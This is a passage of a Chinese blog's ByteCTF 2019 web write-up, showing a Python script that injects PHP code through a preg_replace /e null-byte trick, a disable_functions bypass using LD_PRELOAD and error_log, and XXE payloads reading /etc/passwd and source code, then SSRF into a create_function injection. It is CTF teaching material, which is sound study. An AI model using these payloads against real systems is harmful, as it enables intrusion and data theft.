+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cookie=&#123;</span><br><span class="line">    "PHPSESSID":"pe6c91i1bbks4k21r5endcfh41"</span><br><span class="line">&#125;</span><br><span class="line">def write():</span><br><span class="line">    url="http://112.126.101.16:9999/edit.php"</span><br><span class="line">    data=&#123;</span><br><span class="line">        "title":"glzjin",</span><br><span class="line">        "content":'glzjin',</span><br><span class="line">        "id":"2630"</span><br><span class="line">    &#125;</span><br><span class="line">    r=requests.post(url=url,data=data,cookies=cookie)</span><br><span class="line">    return r.content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = "http://112.126.101.16:9999/replace.php"</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">command = """eval(phpinfo();)"""</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = "------WebKitFormBoundary7MA4YWxkTrZu0gW<span class="symbol">\r</span><span class="symbol">\n</span>Content-Disposition: form-data; name=<span class="symbol">\"</span>regex<span class="symbol">\"</span><span class="symbol">\r</span><span class="symbol">\n</span><span class="symbol">\r</span><span class="symbol">\n</span>1<span class="symbol">\r</span><span class="symbol">\n</span>------WebKitFormBoundary7MA4YWxkTrZu0gW<span class="symbol">\r</span><span class="symbol">\n</span>Content-Disposition: form-data; name=<span class="symbol">\"</span>find<span class="symbol">\"</span><span class="symbol">\r</span><span class="symbol">\n</span><span class="symbol">\r</span><span class="symbol">\n</span>glzjin/e<span class="symbol">\x</span>00<span class="symbol">\r</span><span class="symbol">\n</span>------WebKitFormBoundary7MA4YWxkTrZu0gW<span class="symbol">\r</span><span class="symbol">\n</span>Content-Disposition: form-data; name=<span class="symbol">\"</span>content<span class="symbol">\"</span><span class="symbol">\r</span><span class="symbol">\n</span><span class="symbol">\r</span><span class="symbol">\n</span>glzjin<span class="symbol">\r</span><span class="symbol">\n</span>------WebKitFormBoundary7MA4YWxkTrZu0gW<span class="symbol">\r</span><span class="symbol">\n</span>Content-Disposition: form-data; name=<span class="symbol">\"</span>replace<span class="symbol">\"</span><span class="symbol">\r</span><span class="symbol">\n</span><span class="symbol">\r</span><span class="symbol">\n</span>" +  command +"<span class="symbol">\r</span><span class="symbol">\n</span>------WebKitFormBoundary7MA4YWxkTrZu0gW<span class="symbol">\r</span><span class="symbol">\n</span>Content-Disposition: form-data; name=<span class="symbol">\"</span>id<span class="symbol">\"</span><span class="symbol">\r</span><span class="symbol">\n</span><span class="symbol">\r</span><span class="symbol">\n</span>2630<span class="symbol">\r</span><span class="symbol">\n</span>------WebKitFormBoundary7MA4YWxkTrZu0gW--"</span><br><span class="line">headers = &#123;</span><br><span class="line">    'content-type': "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW",</span><br><span class="line">    'Cookie': "PHPSESSID=pe6c91i1bbks4k21r5endcfh41",</span><br><span class="line">    'cache-control': "no-cache",</span><br><span class="line">    &#125;</span><br><span class="line">write()</span><br><span class="line">response = requests.request("POST", url, data=payload, headers=headers)</span><br><span class="line"></span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>
+<p>command处即可执行命令。查看了phpinfo发现需要绕过disable_functions。<br>又上了de1ta的车。tmp目录下发现了de1ta.so。省的再上传了，直接使用。<br>使用没有被BAN的error_Log来绕过disable_functions。</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">command</span> =  <span class="string">""</span><span class="string">"eval('<span class="variable">$cmd</span> = "</span>/readflag <span class="string">";<span class="variable">$out_path</span> = "</span>/tmp/altman<span class="string">";<span class="variable">$evil_cmdline</span> = <span class="variable">$cmd</span> . "</span> &gt; <span class="string">" . <span class="variable">$out_path</span> . "</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span><span class="string">";putenv("</span>EVIL_CMDLINE=<span class="string">" . <span class="variable">$evil_cmdline</span>);<span class="variable">$so_path</span> = "</span>/tmp/de1ta.so<span class="string">";putenv("</span>LD_PRELOAD=<span class="string">" . <span class="variable">$so_path</span>);error_log("</span><span class="string">", 1, "</span>example<span class="variable">@example</span>.com<span class="string">");echo nl2br(file_get_contents(<span class="variable">$out_path</span>)); unlink(<span class="variable">$out_path</span>);')"</span><span class="string">""</span></span><br></pre></td></tr></table></figure>
+<p>![](./ByteCTF-WEB/屏幕快照 2019-09-08 04.06.29.png)<br>关于bypass可见 <a href="https://github.com/l3m0n/Bypass_Disable_functions_Shell" target="_blank" rel="noopener">https://github.com/l3m0n/Bypass_Disable_functions_Shell</a><br>网上分析文章很多。</p>
+<p>下面两题搬运自队友@glzjin</p>
+<h2 id="RSS"><a href="#RSS" class="headerlink" title="RSS"></a>RSS</h2><p>知识点：</p>
+<ul>
+<li><p>data:// 伪协议</p>
+</li>
+<li><p>xxe * 代码审计</p>
+</li>
+<li><p>SSRF</p>
+</li>
+</ul>
+<p>步骤： 1、打开靶机，看下功能，直接输入一个 rss，给解析出来。</p>
+<p><img src="https://www.zhaoj.in/wp-content/uploads/2019/09/1567950881bf91daec592fad51c0d47392d8badf9c-1024x611.png" alt=""></p>
+<p><img src="https://www.zhaoj.in/wp-content/uploads/2019/09/15679510369530743c9c868c268cb00bbb3f78708f-1024x781.png" alt=""></p>
+<p>同时限制了读取的域名。</p>
+<p><img src="https://www.zhaoj.in/wp-content/uploads/2019/09/1567951062f4c24a688770b5d639bf5b9043815698-1024x398.png" alt=""></p>
+<p>2、那么这里就用 data:// 伪协议直接传数据进去试试，因为 php 对 data 的 mime type 不敏感，直接写成 baidu.com 就可以过这个 host 检测了。为了方便我这里传 base64 之后的。 参考资料：<a href="https://www.jianshu.com/p/80ce73919edb" target="_blank" rel="noopener">https://www.jianshu.com/p/80ce73919edb</a></p>
+<p><img src="https://www.zhaoj.in/wp-content/uploads/2019/09/1567952182d592f3d6d75c51ce888e4a767ae5942a-880x1024.png" alt=""></p>
+<p><img src="https://www.zhaoj.in/wp-content/uploads/2019/09/1567952383ac66d865cf8990821584d2faf25ceaea-1024x422.png" alt=""></p>
+<p><img src="https://www.zhaoj.in/wp-content/uploads/2019/09/156795239939d6c72cae2084fa27a2e0faff84daac-1024x585.png" alt=""></p>
+<p>测试没毛病。</p>
+<p>3、别忘了 RSS 也是 XML，那么就存在 XXE 的问题，我们来试试。</p>
+<p>参考资料：<a href="https://gist.github.com/sl4v/7b5e562f110910f85397" target="_blank" rel="noopener">https://gist.github.com/sl4v/7b5e562f110910f85397</a> ]</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE title [ &lt;!ELEMENT title ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">rss</span> <span class="attr">version</span>=<span class="string">"2.0"</span> <span class="attr">xmlns:atom</span>=<span class="string">"http://www.w3.org/2005/Atom"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">channel</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>The Blog<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span>&gt;</span>http://example.com/<span class="tag">&lt;/<span class="name">link</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>A blog about things<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">lastBuildDate</span>&gt;</span>Mon, 03 Feb 2014 00:00:00 -0000<span class="tag">&lt;/<span class="name">lastBuildDate</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">link</span>&gt;</span>http://example.com<span class="tag">&lt;/<span class="name">link</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">description</span>&gt;</span>a post<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">author</span>&gt;</span>author@example.com<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pubDate</span>&gt;</span>Mon, 03 Feb 2014 00:00:00 -0000<span class="tag">&lt;/<span class="name">pubDate</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">channel</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">rss</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p> 啊哈，出来了。</p>
+<p><img src="https://www.zhaoj.in/wp-content/uploads/2019/09/1567952647726a9614a436bc47ae1fba369b9d8944-1024x835.png" alt=""></p>
+<p>4、那么接下来就来读取站点源码试试，注意有尖括号我们需要套一下 php伪协议，转成 base64。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY xxe<span class="built_in"> SYSTEM </span><span class="string">"php://filter/read=convert.base64-encode/resource=index.php"</span> &gt;]&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://www.zhaoj.in/wp-content/uploads/2019/09/15679528894eb711ac734c1aac15b21ffac79f7857.png" alt="https://www.zhaoj.in/wp-content/uploads/2019/09/15679528894eb711ac734c1aac15b21ffac79f7857-1024x261.png"></p>
+<p>5、读取结果 base64 解码一下，得到 index.php 源码。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">ini_set(<span class="string">'display_errors'</span>,<span class="number">0</span>);</span></span><br><span class="line"><span class="php">ini_set(<span class="string">'display_startup_erros'</span>,<span class="number">1</span>);</span></span><br><span class="line"><span class="php">error_reporting(E_ALL);</span></span><br><span class="line"><span class="php"><span class="keyword">require_once</span>(<span class="string">'routes.php'</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">__autoload</span><span class="params">($class_name)</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(file_exists(<span class="string">'./classes/'</span>.$class_name.<span class="string">'.php'</span>)) &#123;</span></span><br><span class="line"></span><br><span class="line"><span class="php">        <span class="keyword">require_once</span> <span class="string">'./classes/'</span>.$class_name.<span class="string">'.php'</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(file_exists(<span class="string">'./controllers/'</span>.$class_name.<span class="string">'.php'</span>)) &#123;</span></span><br><span class="line"></span><br><span class="line"><span class="php">        <span class="keyword">require_once</span> <span class="string">'./controllers/'</span>.$class_name.<span class="string">'.php'</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>分析下源码，主要是这里有意思，</p>
+<figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usort(<span class="variable">$data</span>, create_function(<span class="string">'<span class="variable">$a</span>, <span class="variable">$b</span>'</span>, <span class="string">'return strcmp(<span class="variable">$a</span>-&gt;'</span>.<span class="variable">$order</span>.<span class="string">',<span class="variable">$b</span>-&gt;'</span>.<span class="variable">$order</span>.<span class="string">');'</span>))<span class="comment">;</span></span><br></pre></td></tr></table></figure>
+
+<p>看到没，直接将 $order 拼到函数体里了。那么这里我们就可以利用这里 RCE 了。 当然这里来源 IP 必须为 127.0.0.1，和上面 routes 里的对上了。 9、来利用那个 XXE 来搞个 SSRF，访问这个页面，rss_url 可以随意传个正常的，order 需要插我们要执行的恶意代码。</p>
+<p>得到返回，看到 flag 文件名。</p>
+<p><img src="https://www.zhaoj.in/wp-content/uploads/2019/09/156795709583844d7486bbf94b37df82d7ad51fc78-1024x744.png" alt=""></p>
+<p>10、读下这个文件。</p>
+<p><img src="https://www.zhaoj.in/wp-content/uploads/2019/09/1567957169e694e209bd313e9fd6ee26d41c0af7f0-1024x427.png" alt=""></p>
+<p>11、Flag 到手~</p>
+<h2 id="icloudmusc"><a href="#icloudmusc" class="headerlink" title="icloudmusc"></a>icloudmusc</h2>
+      
+    </div>
+    <footer class="entry-meta entry-footer">
+      
+      
+      
+    </footer>
+    <hr class="entry-footer-hr">
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2019/08/18/SUCTF2019-Web-writeup/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">SUCTF2019_Web_writeup</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+<!-- Table of Contents -->
+
+  <aside id="sidebar">
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">Contents</strong>
+    
+      <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#boringcode"><span class="nav-number">1.</span> <span class="nav-text">boringcode</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#第一个点"><span class="nav-number">1.1.</span> <span class="nav-text">第一个点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第二个点"><span class="nav-number">1.2.</span> <span class="nav-text">第二个点</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EZCMS"><span class="nav-number">2.</span> <span class="nav-text">EZCMS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babyblog"><span class="nav-number">3.</span> <span class="nav-text">babyblog</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#sql注入"><span class="nav-number">3.1.</span> <span class="nav-text">sql注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#命令执行"><span class="nav-number">3.2.</span> <span class="nav-text">命令执行</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RSS"><span class="nav-number">4.</span> <span class="nav-text">RSS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#icloudmusc"><span class="nav-number">5.</span> <span class="nav-text">icloudmusc</span></a></li></ol>
+    
+    </div>
+  </aside>
+
+</section>
+        
+      </div>
+
+    </div>
+    <!-- <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/tags" class="mobile-nav-link">Tags</a>
+  
+    <a href="/friend" class="mobile-nav-link">Friend</a>
+  
+    <a href="/about" class="mobile-nav-link">About</a>
+  
+</nav> -->
+    <footer id="footer" class="site-footer">
+  
+
+  <div class="clearfix container">
+      <div class="site-info">
+	      &copy; 2019 Altm4nz All Rights Reserved.
+        
+            <span id="busuanzi_container_site_uv">  
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+            </span>
+          
+      </div>
+      <div class="site-credit">
+        Theme by <a href="https://github.com/iTimeTraveler/hexo-theme-hipaper" target="_blank">hipaper</a>
+      </div>
+  </div>
+</footer>
+
+
+<!-- min height -->
+
+<script>
+    var wrapdiv = document.getElementById("wrap");
+    var contentdiv = document.getElementById("content");
+
+    wrapdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
+
+
+    <!-- headerblur min height -->
+    
+    
+</script>
+    
+<div style="display: none;">
+  <script src="https://s11.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
+</div>
+
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+<script src="/js/bootstrap.js"></script>
+<script src="/js/main.js"></script>
+
+
+
+
+
+
+
+
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+  </div>
+
+  <a id="rocket" href="#top" class=""></a>
+  <script type="text/javascript" src="/js/totop.js" async=""></script>
+</body>
+</html>
